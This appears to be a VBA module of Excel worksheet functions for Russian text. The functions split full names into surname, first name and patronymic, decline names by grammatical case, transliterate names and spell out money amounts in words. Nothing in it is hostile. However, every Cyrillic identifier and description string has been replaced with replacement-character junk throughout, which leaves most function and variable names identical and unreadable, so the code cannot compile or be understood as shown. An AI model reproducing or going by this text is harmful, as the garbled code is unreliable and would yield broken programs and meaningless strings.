Attribute |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$)(1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$, , 3)(2)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|.|fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|."
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = CropFIO(|fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = CropFIO(|fffd||fffd||fffd|, True)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(GenitiveCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(DativeCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(InstrumentalCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(AccusativeCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    arr = Split(Application.Trim(FIO$))
    If UBound(arr) = 0 Then |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = |fffd||fffd||fffd|: Exit Function
    arr(0) = ""
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Trim(Join(arr))
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|Sidorov Ivan Andreevitch|fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Translit$(|fffd||fffd||fffd||fffd||fffd|)
End Function

' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 123 |fffd||fffd||fffd||fffd||fffd| 45 |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1, 1, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    s1 = Fix(Val(|fffd||fffd||fffd||fffd||fffd|))
    s2$ = Left(Split(Replace(|fffd||fffd||fffd||fffd||fffd| & "00", ",", ".") & ".00", ".")(1), 2)
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Trim(Propis_Summ_RUS(s1, 1)) & " " & s2$ & " |fffd||fffd||fffd|."
End Function

